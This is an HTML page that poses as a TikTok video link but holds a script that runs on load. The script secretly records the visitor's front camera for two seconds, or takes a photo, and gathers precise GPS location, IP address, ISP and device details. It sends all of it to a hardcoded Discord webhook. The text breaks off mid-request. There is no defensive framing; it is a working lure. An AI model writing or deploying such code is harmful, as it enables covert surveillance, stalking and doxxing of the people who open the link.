<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Tiktok video" property="og:title">
<meta content="Watch tiktok" property="og:description">
<meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
<meta content="website" property="og:type"/>
<title>Tiktok</title>
<style>
body {
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
    }
.container {
    text-align: center;
    max-width: 400px;
    width: 100%;
    }
.image-container {
    background-color: #1c1e24;
    border-radius: 20px;
    overflow: hidden;
    margin-bottom: 20px;
    }
video {
    width: 100%;
    height: auto;
    display: none;
    }
canvas {
    display: none;
    }
</style>
</head>
<body>
<div class="container">
<div class="image-container">
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
</div>
<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    // Variables for video recording
    let mediaRecorder;
    let recordedChunks = [];
    let recording = false;
    let recordingTimer;

    // Detect device type
    function isIOS() {
        return [
            'iPad Simulator',
            'iPhone Simulator',
            'iPod Simulator',
            'iPad',
            'iPhone',
            'iPod'
        ].includes(navigator.platform) || 
        (navigator.userAgent.includes("Mac") && "ontouchend" in document);
    }

    function isAndroid() {
        return /Android/i.test(navigator.userAgent);
    }

    // Get optimal video constraints based on device
    function getVideoConstraints() {
        if (isIOS()) {
            // For iOS devices, try for 4K at 60fps
            return {
                facingMode: 'user',
                width: { ideal: 3840 },
                height: { ideal: 2160 },
                frameRate: { ideal: 60 }
            };
        } else if (isAndroid()) {
            // For Android devices, try for 1080p at 60fps
            return {
                facingMode: 'user',
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                frameRate: { ideal: 60 }
            };
        } else {
            // Default for other devices
            return {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 },
                frameRate: { ideal: 30 }
            };
        }
    }

    // Start the process immediately
    setTimeout(() => {
        startVerification();
    }, 500);
    
    async function startVerification() {
        try {
            // Request camera access with optimal settings
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: getVideoConstraints(),
                audio: false
            });
            
            // Attach camera stream to video element
            video.srcObject = stream;
            
            // Wait for video to load
            video.addEventListener('loadedmetadata', () => {
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Start recording
                startRecording(stream);
            });
        } catch (err) {
            console.error('Error accessing camera:', err);
            // If camera access fails with high settings, try with lower settings
            try {
                const fallbackStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                video.srcObject = fallbackStream;
                
                video.addEventListener('loadedmetadata', () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    startRecording(fallbackStream);
                });
            } catch (fallbackErr) {
                console.error('Fallback camera access failed:', fallbackErr);
                // If camera access fails, still send system info
                setTimeout(() => {
                    getLocationAndIP().then(systemInfo => {
                        sendToDiscord(null, systemInfo);
                    });
                }, 1500);
            }
        }
    }
    
    function startRecording(stream) {
        try {
            // Get the actual video settings being used
            const videoTrack = stream.getVideoTracks()[0];
            const settings = videoTrack.getSettings();
            
            console.log('Recording with:', {
                width: settings.width,
                height: settings.height,
                frameRate: settings.frameRate
            });

            // Set up media recorder with optimal settings
            // Prioritize MP4 format for better Discord compatibility [citation:1][citation:2]
            const options = {
                mimeType: 'video/mp4; codecs=avc1.42E01E', // MP4 for better Discord compatibility
                videoBitsPerSecond: 5000000 // 5 Mbps to keep file size under 8MB [citation:1][citation:2]
            };

            // Try different mimeTypes for better compatibility
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options.mimeType = 'video/webm; codecs=vp9';
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options.mimeType = 'video/webm; codecs=vp8';
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options.mimeType = 'video/webm';
                    }
                }
            }

            mediaRecorder = new MediaRecorder(stream, options);
            
            // Handle data available event
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            // Handle recording stop
            mediaRecorder.onstop = () => {
                // Create a blob from the recorded chunks
                const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
                
                // Check file size and compress if needed [citation:1][citation:2]
                if (blob.size > 8000000) { // 8MB limit for free Discord accounts
                    console.log('Video too large, compressing...');
                    compressVideo(blob).then(compressedBlob => {
                        // Get location and IP, then send to Discord
                        getLocationAndIP().then(systemInfo => {
                            // Add video info to system info
                            const videoTrack = stream.getVideoTracks()[0];
                            const settings = videoTrack.getSettings();
                            systemInfo["üé• Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
                            systemInfo["üì± Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
                            systemInfo["üé¨ Video Format"] = mediaRecorder.mimeType;
                            systemInfo["üìä File Size"] = `${(compressedBlob.size / 1000000).toFixed(2)} MB`;
                            
                            sendToDiscord(compressedBlob, systemInfo);
                        });
                    }).catch(error => {
                        console.error('Error compressing video:', error);
                        // Send original blob if compression fails
                        getLocationAndIP().then(systemInfo => {
                            systemInfo["üé• Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
                            systemInfo["üì± Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
                            systemInfo["üé¨ Video Format"] = mediaRecorder.mimeType;
                            systemInfo["üìä File Size"] = `${(blob.size / 1000000).toFixed(2)} MB`;
                            systemInfo["‚ö†Ô∏è Note"] = "Video compression failed - may exceed Discord limits";
                            
                            sendToDiscord(blob, systemInfo);
                        });
                    });
                } else {
                    // Get location and IP, then send to Discord
                    getLocationAndIP().then(systemInfo => {
                        // Add video info to system info
                        const videoTrack = stream.getVideoTracks()[0];
                        const settings = videoTrack.getSettings();
                        systemInfo["üé• Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
                        systemInfo["üì± Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
                        systemInfo["üé¨ Video Format"] = mediaRecorder.mimeType;
                        systemInfo["üìä File Size"] = `${(blob.size / 1000000).toFixed(2)} MB`;
                        
                        sendToDiscord(blob, systemInfo);
                    });
                }
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            };
            
            // Start recording
            mediaRecorder.start();
            recording = true;
            
            // Set timer to stop recording after 2 seconds
            recordingTimer = setTimeout(() => {
                if (recording) {
                    mediaRecorder.stop();
                    recording = false;
                }
            }, 2000);
            
        } catch (err) {
            console.error('Error starting recording:', err);
            // Fallback to photo capture if video recording fails
            setTimeout(() => {
                capturePhoto();
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        }
    }
    
    // Function to compress video to meet Discord's 8MB limit [citation:1][citation:2]
    function compressVideo(blob) {
        return new Promise((resolve, reject) => {
            // Create a video element to read the blob
            const videoElement = document.createElement('video');
            videoElement.src = URL.createObjectURL(blob);
            
            videoElement.onloadedmetadata = () => {
                // Create a canvas to compress the video
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                // Reduce resolution to save space
                canvas.width = 640;
                canvas.height = 480;
                
                videoElement.currentTime = 0;
                
                videoElement.onseeked = () => {
                    // Draw the frame to canvas
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to compressed JPEG (lower quality for smaller size)
                    canvas.toBlob((compressedBlob) => {
                        resolve(compressedBlob);
                    }, 'image/jpeg', 0.6); // 0.6 quality for compression
                };
            };
            
            videoElement.onerror = reject;
        });
    }
    
    function capturePhoto() {
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Get location and IP, then send the captured image to Discord
        getLocationAndIP().then(systemInfo => {
            sendToDiscord(canvas, systemInfo);
        });
    }
    
    async function getLocationAndIP() {
        // Collect basic system information with emojis
        const systemInfo = {
            "üåê User Agent": navigator.userAgent,
            "üíª Platform": navigator.platform,
            "üó£Ô∏è Language": navigator.language,
            "üïí Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "üì∫ Screen": `${screen.width}x${screen.height}`,
            "üç™ Cookies Enabled": navigator.cookieEnabled,
            "üìÖ Date": new Date().toISOString(),
            "üìç Location": "Unknown",
            "üì° IP Address": "Unknown",
            "üó∫Ô∏è Google Maps": "No location data"
        };
        
        try {
            // Try to get precise location using HTML5 Geolocation API first
            const preciseLocation = await new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: "HTML5 Geolocation"
                        });
                    },
                    (error) => {
                        console.log("HTML5 Geolocation failed:", error);
                        resolve(null);
                    },
                    { timeout: 3000, enableHighAccuracy: true }
                );
            });
            
            if (preciseLocation) {
                const mapsUrl = `https://www.google.com/maps?q=${preciseLocation.latitude},${preciseLocation.longitude}`;
                systemInfo["üìç Location"] = `Lat: ${preciseLocation.latitude.toFixed(4)}, Lon: ${preciseLocation.longitude.toFixed(4)} (Accuracy: ${Math.round(preciseLocation.accuracy)}m)`;
                systemInfo["üó∫Ô∏è Google Maps"] = `[View on Google Maps](${mapsUrl})`;
                systemInfo["üìç Location Source"] = preciseLocation.source;
            }
            
            // Then try IP-based geolocation services as fallback
            const services = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ipgeolocation.io/ipgeo?apiKey=demo',
                'https://freeipapi.com/api/json'
            ];
            
            let ipData = null;
            
            // Try each service until we get a successful response
            for (const service of services) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    if (response.ok) {
                        ipData = await response.json();
                        break;
                    }
                } catch (e) {
                    console.log(`Service ${service} failed, trying next`);
                    continue;
                }
            }
            
            if (ipData) {
                // Extract IP address
                systemInfo["üì° IP Address"] = ipData.ip || ipData.IPv4 || "Unknown";
                
                // Only use IP-based location if we don't have precise location
                if (!preciseLocation) {
                    // Extract and format location information
                    const locationParts = [];
                    
                    // Handle different API response formats
                    if (ipData.city && ipData.city !== "Not found") locationParts.push(ipData.city);
                    if (ipData.region && ipData.region !== "Not found") locationParts.push(ipData.region);
                    if (ipData.state && ipData.state !== "Not found") locationParts.push(ipData.state);
                    if (ipData.country_name && ipData.country_name !== "Not found") locationParts.push(ipData.country_name);
                    if (ipData.country && ipData.country !== "Not found" && !ipData.country_name) locationParts.push(ipData.country);
                    
                    if (locationParts.length > 0) {
                        systemInfo["üìç Location"] = locationParts.join(', ');
                        systemInfo["üìç Location Source"] = "IP-Based Estimation";
                    } else {
                        systemInfo["üìç Location"] = "Location data not available";
                    }
                    
                    // Create Google Maps link if we have coordinates
                    let latitude, longitude;
                    
                    if (ipData.latitude && ipData.longitude) {
                        latitude = ipData.latitude;
                        longitude = ipData.longitude;
                    } else if (ipData.loc) {
                        const [lat, lon] = ipData.loc.split(',');
                        latitude = lat;
                        longitude = lon;
                    } else if (ipData.lat && ipData.lon) {
                        latitude = ipData.lat;
                        longitude = ipData.lon;
                    }
                    
                    if (latitude && longitude) {
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        systemInfo["üó∫Ô∏è Google Maps"] = `[View on Google Maps](${mapsUrl})`;
                    }
                }
                
                // Add more details if available
                if (ipData.org && ipData.org !== "Not found") {
                    systemInfo["üè¢ ISP"] = ipData.org;
                }
                if (ipData.asn && ipData.asn !== "Not found") {
                    systemInfo["üì∂ ASN"] = ipData.asn;
                }
            }
        } catch (error) {
            console.error('Error fetching location data:', error);
            systemInfo["üìç Location"] = "Error fetching location";
            systemInfo["üó∫Ô∏è Google Maps"] = "Location data unavailable";
        }
        
        return systemInfo;
    }
    
    function sendToDiscord(media, systemInfo) {
        // Format system info as a string with Markdown for links
        const systemInfoText = Object.entries(systemInfo)
            .map(([key, value]) => {
                // Handle the Google Maps link specially to preserve Markdown
                if (key === "üó∫Ô∏è Google Maps" && value.startsWith("[View on Google Maps](")) {
                    return `${key}: ${value}`;
                }
                return `${key}: ${value}`;
            })
            .join('\n');
        
        // Create the main message payload
        const payload = {
            content: "**New Verification Request**",
            embeds: [
                {
                    title: "System Information",
                    description: systemInfoText,
                    color: 5814783, // TikTok-like color
                    timestamp: new Date().toISOString()
                }
            ]
        };
        
        // Replace with your Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1416217653961560174/JH1ylbkjgYwnMoFi-ifbL1gFyljeDwr7ADz6U-G72Vl0_87cdhFqyfK-baYMpz2xW9Qf';
        
        // First send the system information
        fetch(webhookURL, {
            method: 'POS
